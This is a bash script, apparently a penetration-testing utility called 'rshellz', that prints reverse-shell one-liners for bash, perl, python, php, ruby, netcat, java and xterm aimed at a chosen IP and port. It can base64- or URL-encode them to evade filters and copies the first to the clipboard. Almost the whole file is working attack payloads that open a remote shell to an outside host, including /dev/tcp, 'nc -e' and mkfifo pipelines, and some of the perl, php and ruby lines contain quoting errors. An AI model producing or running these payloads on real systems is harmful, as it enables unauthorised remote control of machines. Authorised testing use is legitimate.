#!/bin/bash
# title: rshellz
# version: 1.1
# author: https://github.com/brsalcedom (Cervant)

greenC="\e[0;32m\033[1m" 
endC="\033[0m\e[0m" 
redC="\e[0;31m\033[1m" 
blueC="\e[0;34m\033[1m" 
yellowC="\e[0;33m\033[1m" 
purpleC="\e[0;35m\033[1m" 
turquoiseC="\e[0;36m\033[1m" 
grayC="\e[0;37m\033[1m" 
script_name=$(basename $0)
	
if [ ! "$(command -v xclip)" ]; then
	echo -e "\n${redC}[!]${endC} Please install ${yellowC}xclip${endC} to use this tool\n"
	exit 0
fi

banner () {
	echo ""
	echo -e "$greenC  ██▀███    ██████  ██░ ██ ▓█████  ██▓     ██▓    ▒███████▒ $endC"
	echo -e "$greenC ▓██ ▒ ██▒▒██    ▒ ▓██░ ██▒▓█   ▀ ▓██▒    ▓██▒    ▒ ▒ ▒ ▄▀░ $endC"
	echo -e "$greenC ▓██ ░▄█ ▒░ ▓██▄   ▒██▀▀██░▒███   ▒██░    ▒██░    ░ ▒ ▄▀▒░  $endC"
	echo -e "$greenC ▒██▀▀█▄    ▒   ██▒░▓█ ░██ ▒▓█  ▄ ▒██░    ▒██░      ▄▀▒   ░ $endC"
	echo -e "$greenC ░██▓ ▒██▒▒██████▒▒░▓█▒░██▓░▒████▒░██████▒░██████▒▒███████▒ $endC"
	echo -e "$greenC ░ ▒▓ ░▒▓░▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░░ ▒░ ░░ ▒░▓  ░░ ▒░▓  ░░▒▒ ▓░▒░▒ $endC"
	echo -e "$greenC  ░▒ ░ ▒░░ ░▒  ░ ░ ▒ ░▒░ ░ ░ ░  ░░ ░ ▒  ░░ ░ ▒  ░░░▒ ▒ ░ ▒  $endC"
	echo -e "$greenC  ░░   ░ ░  ░  ░   ░  ░░ ░   ░     ░ ░     ░ ░   ░ ░ ░ ░ ░  $endC"
	echo -e "$greenC   ░           ░   ░  ░  ░   ░  ░    ░  ░    ░  ░  ░ ░      $encC"
	echo -e "${yellowC}https://github.com/brsalcedom${endC}"
}

helpPanel () {
	banner
	echo -e "\n${grayC}[+] Usage: $script_name -t bash -i 10.0.0.1 -p 443"
	echo -e "\n\t${yellowC}-h\t\t:${endC} ${blueC}Show this help panel${endC}"
	echo -e "\t${yellowC}-t SHELL\t:${endC} ${blueC}Type of shell${endC}"
	echo -e "\t${yellowC}-i IP\t\t:${endC} ${blueC}Specify ip address${endC}"
	echo -e "\t${yellowC}-p PORT\t\t:${endC} ${blueC}Specify port${endC}"
	echo -e "\t${yellowC}-e ENCODING\t:${endC} ${blueC}Encode to base64 or urlencode${endC}"
	echo -e "\t${yellowC}-q\t\t:${endC} ${blueC}Hide banner${endC}\n"
}
	
parameter_counter=0 

while getopts ":h:t:i:p:e:q" arg
  do
    case $arg in
      (t) shell_type=$OPTARG  && let parameter_counter+=1 ;;
      (i) ip_address=$OPTARG  && let parameter_counter+=1 ;;
      (p) local_port=$OPTARG  && let parameter_counter+=1 ;;
      (e) encoding=$OPTARG && let parameter_counter+=1 ;;
      (q) quiet=true ;;
      (h) helpPanel ;;
    esac
done
if [[ $parameter_counter -lt 3 ]]; then
    helpPanel
else
    if [[ -z $quiet ]];then banner; fi
  	if [[ $parameter_counter -eq 4 ]]; then
	 if [[ -z $(echo $encoding | grep -oP '(^urlencode$)|(^base64$)') ]]; then
    	   echo -e "\n${redC}[!] Please provide a valid encoding option: ${blueC}\n\n- base64\n- urlencode${endC}"
	   exit 0
	 fi
	fi

  	if [[ -z $(echo $ip_address | grep -oP '^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$') ]]; then
    	 echo -e "\n${redC}[!] Please provide a valid ip address.${endC}"
    	 exit 0
  	fi
  	if [[ -z $(echo $local_port | grep -oP '^\d{1,5}$') ]]; then
    	 echo -e "\n${redC}[!] Please provide a valid port.${endC}"
    	 exit 0
  	fi

  b64encode() {
	 encoded=$(echo -n "$1" | base64 -w 0)
	 echo "$encoded"
  }

  urlencode() {
  	   encoded=$(echo "$@" | sed \
        -e 's/%/%25/g' \
        -e 's/ /%20/g' \
        -e 's/!/%21/g' \
        -e 's/"/%22/g' \
        -e "s/'/%27/g" \
        -e 's/#/%23/g' \
        -e 's/(/%28/g' \
        -e 's/)/%29/g' \
        -e 's/+/%2b/g' \
        -e 's/,/%2c/g' \
        -e 's/-/%2d/g' \
        -e 's/:/%3a/g' \
        -e 's/;/%3b/g' \
        -e 's/?/%3f/g' \
        -e 's/@/%40/g' \
        -e 's/\$/%24/g' \
        -e 's/\&/%26/g' \
        -e 's/\*/%2a/g' \
        -e 's/\./%2e/g' \
        -e 's/\//%2f/g' \
        -e 's/\[/%5b/g' \
        -e 's/\\/%5c/g' \
        -e 's/\]/%5d/g' \
        -e 's/\^/%5e/g' \
        -e 's/_/%5f/g' \
        -e 's/`/%60/g' \
        -e 's/{/%7b/g' \
        -e 's/|/%7c/g' \
        -e 's/}/%7d/g' \
	-e 's/~/%7e/g')
	echo "$encoded"
  }

  print_shell () {
	shell_count=0
	for shell in "$@"; do
		if [[ $encoding = "base64" ]]; then
    			shell=$(b64encode "$shell")
		fi
		if [[ $encoding = "urlencode" ]]; then
			shell=$(urlencode "$shell")
		fi
		let shell_count+=1
		if [[ $shell_count -eq "1" ]]; then
    			echo -e "\n${grayC}Your reverse shell: ${blueC}(copied to clipboard)${endC}"
    			echo -e "\n\t${greenC}[+] ${turquoiseC}${shell}${endC}"
    			echo $shell | tr -d '\n' | xclip -sel clip 2>/dev/null
		elif [[ $shell_count -gt "1" ]]; then
    			echo -e "\n${grayC}Alternative shell:${endC}"
    			echo -e "\n\t${greenC}[+] ${turquoiseC}${shell}${endC}"
		fi
  	done
  }
  case $shell_type in
    (bash) reverse_shell="bash -i >& /dev/tcp/$ip_address/$local_port 0>&1"
      reverse_shell_2="bash -c 'bash -i >& /dev/tcp/$ip_address/$local_port 0>&1'"
      print_shell "$reverse_shell" "$reverse_shell_2";;
    (perl) reverse_shell="perl -e 'use Socket;$i="$ip_address";$p=$local_port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'" 
      print_shell "$reverse_shell" ;;
    (python) reverse_shell="python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip_address\",$local_port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" 
      print_shell "$reverse_shell" ;;
    (php) reverse_shell="php -r '$sock=fsockopen("$ip_address",$local_port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" 
      print_shell "$reverse_shell" ;;
    (ruby) reverse_shell="ruby -rsocket -e'f=TCPSocket.open(\$ip_address\",$local_port).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'" 
        print_shell "$reverse_shell" ;;
    (netcat) reverse_shell="nc -e /bin/sh $ip_address $local_port" 
      reverse_shell_2="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ip_address $local_port >/tmp/f" 
      print_shell "$reverse_shell" "$reverse_shell_2" ;;
    (java) reverse_shell="Runtime r = Runtime.getRuntime();
Process p = r.exec(\"/bin/bash -c 'exec 5<>/dev/tcp/$ip_address/$local_port;cat <&5 | while read line; do $line 2>&5 >&5; done'\");
p.waitFor();" 
    print_shell "$reverse_shell" ;;
    (xterm) reverse_shell="xterm -display $ip_address:$local_port" 
      print_shell "$reverse_shell" ;;
    (*) 
      if [[ -z $quiet ]]; then banner; fi
      echo -e "\n${redC}[!] Please choose one of the following:\n${blueC}\n- bash\n- perl\n- php\n- python\n- ruby\n- netcat\n- java\n- xterm${endC}" ;;
  esac
fi
